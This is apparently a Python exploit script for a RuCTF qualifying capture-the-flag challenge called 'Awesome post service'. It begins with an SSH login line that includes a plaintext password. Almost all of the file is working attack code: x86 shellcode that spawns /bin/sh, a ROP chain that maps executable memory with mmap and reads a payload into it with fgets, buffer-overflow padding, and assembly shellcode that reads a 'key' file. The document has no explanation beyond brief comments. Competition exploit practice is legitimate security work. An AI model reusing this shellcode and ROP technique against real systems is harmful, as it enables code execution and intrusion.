__author__ = 'HuyNA'
"""
Awesome post service -- ssh user@vuln2.quals.ructf.org -p 2022 user:Ikiy7ei5
"""
"""
    username = char[256]

    number of note <= 12

    python -c "mess='huyna\x00huyna\n';print mess"

    b *0x08048383
    b *0x080482CA

"""
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
null_string = "\x00\x00\x10\x00"
size_string = "\x00\x10\x00\x00"
prot_string = "\x07\x00\x00\x00"
flag_string = "\x21\x00\x00\x00"
fd_string = "\xFF\xFF\xFF\xFF"
offset_string = "\x00\x00\x00\x00"
mmap_address_string = "\xD0\x17\x06\x08"
return_address1_string = "\x85\x83\x04\x08"
size_string = "\x30\x18\x00\x00"
pop6_ret_address = "\x61\x88\x05\x08"
pop8_ret_address = "\x2b\xd0\x04\x08" # .text:0804D02B 02C 83 C4 2C                        add     esp, 2Ch                ; Add
pop3_ret_address = "\x54\x85\x04\x08"
fgets_address = "\xC0\x72\x05\x08"
stdin_address = "\xC0\x69\x0D\x08"
rop = "abcd"*4
rop += mmap_address_string
rop += pop6_ret_address
rop += null_string
rop += size_string
rop += prot_string
rop += flag_string
rop += fd_string
rop += offset_string
rop += fgets_address
rop += pop3_ret_address
rop += null_string
rop += size_string
rop += stdin_address
rop += fgets_address
rop += null_string
rop += null_string
rop += size_string
rop += stdin_address
data_address_string = "\xc9\x14\x06\x08" # 0x080614C9
message = rop + "\n"
message += "2\n"
title = "a"*200
message += title + "\n"
content = "b"*256 + data_address_string
message += content + "\n"
message += shellcode+"\n"
message += shellcode+"\n"
print message;

fake_vt = "\x8C\x9E\x0B\x08"    # 080B9E8C

funciton_phase_1 = "\x7c\x0b\x9e\x7c" # 080B9EAC - 0x30

bu = "a"*0x10 + "d"*4 +"b"*4 + "c"*4

buffer = fake_vt + 'a'*0x90 + funciton_phase_1

# y tuong 1  _IO_mem_sync
# y tuong 2 :  _IO_str_finish proc near

# 0xbff3a350
# 0xbffffbc0

shellcode = "\x83\xec\x20\x31\xc0\xc7\x44\x24\x18\x00\x00\x00\x00\xc7\x44\x24\x18\x6b\x65\x79\x00\x8d\x44\x24\x18\xc7\x44\x24\x04\x00\x00\x00\x00\x89\x04\x24\xe8\x77\x0b\x06\x08\x89\x44\x24\x14\xc7\x44\x24\x08\x00\x01\x00\x00\x8d\x44\x24\x1c\x89\x44\x24\x04\x8b\x44\x24\x14\x89\x04\x24\xe8\x07\x0c\x06\x08\x8d\x44\x24\x1c\x89\x04\x24\xe8\xdb\x71\x05\x08\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
null_string = "\x00\x00\x00\x08"
size_string = "\x00\x20\x00\x00"
prot_string = "\x07\x00\x00\x00"
flag_string = "\x22\x00\x00\x00"
fd_string = "\xFF\xFF\xFF\xFF"
offset_string = "\x00\x00\x00\x00"
mmap_address_string = "\xD0\x17\x06\x08"
return_address1_string = "\x85\x83\x04\x08"
pop6_ret_address = "\x61\x88\x05\x08"
pop3_ret_address = "\x54\x85\x04\x08"
fgets_address = "\xC0\x72\x05\x08"
stdin_address = "\xC0\x69\x0D\x08"
rop = "abcd"*5
rop += mmap_address_string
rop += pop6_ret_address
rop += null_string
rop += size_string
rop += prot_string
rop += flag_string
rop += fd_string
rop += offset_string
rop += fgets_address
rop += pop3_ret_address
rop += null_string
rop += size_string
rop += stdin_address
rop += fgets_address
rop += null_string
rop += null_string
rop += size_string
rop += stdin_address
data_address_string = "\xca\x14\x06\x08"
message = rop + "\n"
message += "2"+"\n"
message += "key\x00" + "\n"
message += "b"*256 + data_address_string + "\n"
message += shellcode+"\n"
message += shellcode+"\n"
print message;

# b *0x0805738D

"""
shellcode = "\x83\xec\x20\x31\xc0\xc7\x44\x24\x18\x00\x00\x00\x00\xc7\x44\x24\x18\x6b\x65\x79\x00\x8d\x44\x24\x18\xc7\x44\x24\x04\x00\x00\x00\x00\x89\x04\x24\xba\xa0\x0b\x06\x08\xff\xd2\x89\x44\x24\x14\xc7\x44\x24\x08\x00\x01\x00\x00\x8d\x44\x24\x1c\x89\x44\x24\x04\x8b\x44\x24\x14\x89\x04\x24\xba\x50\x0c\x06\x08\xff\xd2\x8d\x44\x24\x1c\x89\x04\x24\xba\x30\x72\x05\x08\xff\xd2";null_string = "\x00\x00\x00\x08";size_string = "\x00\x20\x00\x00";prot_string = "\x07\x00\x00\x00";flag_string = "\x22\x00\x00\x00";fd_string = "\xFF\xFF\xFF\xFF";offset_string = "\x00\x00\x00\x00";mmap_address_string = "\xD0\x17\x06\x08";return_address1_string = "\x85\x83\x04\x08";pop6_ret_address = "\x61\x88\x05\x08";pop3_ret_address = "\x54\x85\x04\x08";fgets_address = "\xC0\x72\x05\x08";stdin_address = "\xC0\x69\x0D\x08";rop = "abcd"*5;rop += mmap_address_string;rop += pop6_ret_address;rop += null_string;rop += size_string;rop += prot_string;rop += flag_string;rop += fd_string;rop += offset_string;rop += fgets_address;rop += pop3_ret_address;rop += null_string;rop += size_string;rop += stdin_address;rop += fgets_address;rop += null_string;rop += null_string;rop += size_string;rop += stdin_address;data_address_string = "\xca\x14\x06\x08";message = rop + "\n";message += "2"+"\n";message += "key\x00" + "\n";message += "b"*256 + data_address_string + "\n";message += shellcode+"\n";message += shellcode+"\n";print message;

BITS 32

sub	esp,0x20
xor    	eax,eax
mov 	dword [esp+0x18], 0x00
mov    	dword [esp+0x18], 0x79656b
lea	eax,[esp+0x18]
mov    	dword [esp+0x4], 0x0
mov    	dword [esp],eax
mov 	edx,0x08060BA0
call 	edx
mov    	dword [esp+0x14], eax
mov    	dword [esp+0x8],0x100
lea    	eax, [esp+0x1c]
mov    	dword [esp+0x4],eax
mov    	eax, dword [esp+0x14]
mov    	dword [esp],eax
mov 	edx,0x08060C50
call 	edx
lea    	eax,[esp+0x1c]
mov    	dword [esp],eax
mov 	edx,0x08057230
call 	edx

"""